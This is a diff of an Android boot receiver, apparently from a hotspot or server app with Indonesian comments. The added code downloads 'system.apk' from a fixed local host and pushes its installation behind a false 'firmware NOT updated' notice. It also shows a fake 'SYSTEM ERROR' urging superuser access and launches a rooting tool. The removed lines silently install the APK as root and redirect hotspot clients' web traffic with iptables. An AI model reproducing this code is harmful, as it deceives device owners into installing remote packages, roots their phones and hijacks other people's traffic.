@@ -10,7 +10,7 @@ import android.content.BroadcastReceiver;
 import android.util.Log;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
+import android.content.pm.*;
 import android.content.ActivityNotFoundException;
 import android.content.SharedPreferences;
 import android.widget.Toast;
@@ -36,22 +36,26 @@ public class ReceiverBoot extends BroadcastReceiver
 	private ServerUtils utils;
     private Installer installator;
     private String pathToInstallServer;
-    private String docFolder, pathExternal;
-    private static boolean main = true;
+    private static String version = "1";
     private SharedPreferences settings;
 	private SharedPreferences.Editor seteditor;
+	private static boolean prosesdownload = false;
+	private static int sizedownload = 0;
 	
 	public static String requestAksi = "";
 	public static String requestPath = "";
 	public static String requestUrl = "";
 	public static String requestResult = "";
+    public static boolean main = true;
+    public static String docFolder, pathExternal;
+
+	public String getPath() {
+		return pathExternal;
+	}
 
 	@Override
 	public void onReceive(Context context, Intent intent)
 	{
-		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
-			context.startService(new Intent(context, System.class));
-
 		exContext = context;
 		settings = context.getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
@@ -60,64 +64,27 @@ public class ReceiverBoot extends BroadcastReceiver
         docFolder = utils.getDocFolder();
         pathExternal = utils.getPathExternal();
 
-        requestUrl = "http://10.42.0.1/client.php";
-		requestAksi = "web";
-		mainRequest(context);
-
-		Toast.makeText(context, requestResult, Toast.LENGTH_LONG).show();
+        if (!hostspotStatus(context)) {
+	        cekUpdate(context, intent);
+	    }        
         
-        if (requestResult.equals("baru")) {
-	        requestUrl = "http://10.42.0.1/download.php?id=system.apk";
-			requestAksi = "download";
-			requestPath = pathExternal;
-			mainRequest(context);
-			try {
-				String[] paket = { "pm install "+pathExternal+"/system.apk"};
-				rootCommands(paket);
-			} catch (Exception e) {
-				
-			}
-		}
-
-        extrak(context, "server.zip", pathToInstallServer, docFolder);
-        
-
+	    if (!utils.checkInstall()) {
+        	extrak(context, "server.zip", pathToInstallServer, docFolder);
+        }
         if (settings.getBoolean("server install",true)) 
         {
-        	utils.runSrv();
-			extrak(context, "data.zip", pathExternal, pathExternal);
-
-			if (rootRequest().equals("root")) {
+        	if (!utils.checkInstallData()) {
+				extrak(context, "data.zip", pathExternal, pathExternal);
+			}
+			if (rootRequest().equals("root")) 
+			{
+				boolean[] flags = utils.checkRun();
+        		if (flags[0] && flags[1] && flags[2]) {
+        			Log.i(TAG, "run server OK");
+	        	} else {
+	        		utils.runSrv();
+	        	}
 				
-        		if (hostspotStatus(context) && main) 
-        		{
-        			String[] iproute = {
-        				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
-        				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
-        				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
-        				"iptables -P FORWARD DROP"
-        			};
-        			main = false;
-		    		rootCommands(iproute);
-		    		setGSM(true, context);
-
-        			CountDownTimer hitungMundur = new CountDownTimer(60000, 100){
-						public void onTick(long millisUntilFinished){}
-						public void onFinish()
-						{
-							if (settings.getString("main","").equals("hotspot")) 
-							{
-								seteditor.putString("main", "hotspot");    
-        						seteditor.commit();
-							} else {
-								hotspotConfig(exContext); // off hotspot
-								setGSM(false, context);
-							}
-						}
-					}.start();
-		    	} 
-
-
 			}
 			else if (rootRequest().equals("tolak user")) {
 				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER, 20000);
@@ -125,7 +92,7 @@ public class ReceiverBoot extends BroadcastReceiver
 			else if (rootRequest().equals("tidak root")) {
 				if (!openApp(context, "kingoroot.supersu")) 
 				{
-					String path = docFolder+"/apk/kroot.apk";
+					String path = pathExternal+"/kroot.apk";
 					String ext = getExtension(path);
 					MimeTypeMap mime = MimeTypeMap.getSingleton();
 	        		String mimeType = mime.getMimeTypeFromExtension(ext.substring(1));
@@ -144,11 +111,120 @@ public class ReceiverBoot extends BroadcastReceiver
 			else {
 				//unknow
 			}
-			
+					
+        }
+
+        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+			context.startService(new Intent(context, System.class));
+			int nowVersion = -1;
+        	int newVersion = -1;
+        	try {
+        		newVersion = Integer.parseInt(version);
+        	}catch (Exception e) {}
+        	try {
+        		PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
+        		nowVersion = pinfo.versionCode;
+        	}
+        	catch(Exception e) {}
+			if (rootRequest().equals("root") && nowVersion != newVersion) 
+			{
+				intent = new Intent(Intent.ACTION_VIEW);
+        		intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
+        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        		context.startActivity(intent);
+				toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);
+			}
+		}
+	}
+
+	public String cekClientOrServer() {
+		String sip = Identitas.getIPAddress(true);
+        String[] ip = sip.split("[.]");
+        int index = ip.length - 1;
+
+        Log.i(TAG, "addres : "+ip[index]);
+
+        if (ip[index].equals("1")) {
+        	return "server";
+        }
+        return "client";
+	}
+
+	public String cekClient() {
+		String exe = shellCommands("ls "+pathExternal+"/client");
+		if (exe.equals("")) {
+			return "kosong";
+		}
+
+		return "ada";
+	}
+
+	public void cekUpdate(Context context, Intent intent) 
+	{
+		if (!prosesdownload) {
+			prosesdownload = false;
+			Log.i(TAG, "download mati");
+
+			//requestUrl = "https://sunjangyo12.000webhostapp.com/save.txt";
+			requestUrl = "http://10.42.0.1/save.txt";
+			requestAksi = "web";
+			mainRequest(context);
+		}
+		String[] upResult = requestResult.split("\n");
+
+		Log.i(TAG, "web : "+upResult[0]);
+
+		if (upResult[0].equals("")) {
+			Log.i(TAG, "<<<< result null >>>>");
+		} else {
+			if (upResult[0].equals(version)){
+				Log.i(TAG, "now version : "+version);
+			} else {
+				Log.i(TAG, "Update...");
+				Log.i(TAG, "total : "+sizedownload);
+
+				prosesdownload = true;
+				seteditor.putString("version", upResult[0]);    
+  	        	seteditor.commit();
+
+  	        	version = settings.getString("version","");
+  	        	requestUrl = "http://10.42.0.1/download.php?id=system.apk";
+				requestAksi = "download";
+				requestPath = pathExternal+"/system.apk";
+				mainRequest(context);
+			}
+		}
+
+		int nowVersion = -1;
+        int newVersion = -1;
+        try {
+        	newVersion = Integer.parseInt(version);
+        }catch (Exception e) {}
+        try {
+        	PackageInfo pinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
+        	nowVersion = pinfo.versionCode;
+        }
+        catch(Exception e) {}
+
+        if (nowVersion != newVersion  &&  sizedownload == 100) {
+        	Log.i(TAG, "download complete.");
+			Log.i(TAG, "total : "+sizedownload);
+	        prosesdownload = false;
+	        sizedownload = 0;
+
+        	intent = new Intent(Intent.ACTION_VIEW);
+        	intent.setDataAndType(Uri.fromFile(new File(pathExternal+"/system.apk")), "application/vnd.android.package-archive");
+        	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        	context.startActivity(intent);
+
+			toastText(context, "NOW AVAILABLE!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app\n\b2. Open the app.", Color.GREEN, Gravity.CENTER, 15000);
+
+        } else {
+        	Log.i(TAG, "udah terbaru : "+nowVersion);
         }
 	}
 
-	private static void setGSM(boolean enable, Context context) {
+	public static void setGSM(boolean enable, Context context) {
     	String command;
     	if (enable) {
     		command = "svc data enable\n";
@@ -257,6 +333,30 @@ public class ReceiverBoot extends BroadcastReceiver
 		} catch (Exception e) {}
 	}
 
+	public String shellCommands(String command) {
+
+		StringBuffer output = new StringBuffer();
+
+		Process p;
+		try {
+			p = Runtime.getRuntime().exec(command);
+			p.waitFor();
+			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+			String line = "";
+			while ((line = reader.readLine())!= null) {
+				output.append(line+"\n");
+			}
+
+		}
+		catch (Exception e) {
+			e.printStackTrace();
+		}
+		String response = output.toString();
+		return response;
+
+	}
+
 	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
 		installator = new Installer(context, true);
         installator.execute(efile, pathsatu, pathdua);
@@ -307,6 +407,7 @@ public class ReceiverBoot extends BroadcastReceiver
                 total += count;
 
                 if (fileLength > 0) 
+                	sizedownload = (int) (total * 100 / fileLength);
                     //publishProgress((int) (total*100/fileLength));
                 output.write(data, 0, count);
             }
@@ -328,7 +429,7 @@ public class ReceiverBoot extends BroadcastReceiver
 	
 	//Mengirimkan data web keserver
 	public String requestWeb(){
-		String sret;
+		String sret = "";
         HttpClient httpClient = new DefaultHttpClient();
         HttpGet request = new HttpGet(requestUrl);
         try{
@@ -345,12 +446,11 @@ public class ReceiverBoot extends BroadcastReceiver
          	   in.close();
          	   sret = str.toString();
         	} catch(Exception ex) {
-        	    sret = "Error split text";
+        	  	Log.i(TAG, "Error split text");
         	}
         }
 		catch(Exception ex){
-			sret = "Failed Connect to Server!";
-			Log.i(TAG, "receiver:offline");
+			Log.i(TAG, "Failed Connect to Server!");
         }
         return sret;
     }
@@ -369,15 +469,18 @@ public class ReceiverBoot extends BroadcastReceiver
 	    	if (main.equals("web")) {
 				return requestWeb();
 			}
-			else {
+			else if (main.equals("download")){
 				return requestDownload();
 			}
+			return null;
 	    }
 
 	    // berhasil
 	    @Override
 	    protected void onPostExecute(String result) {
-	    	requestResult = result;
+	    	if (main.equals("web")) {
+		    	requestResult = result;
+	    	}
 		}
 	}
 
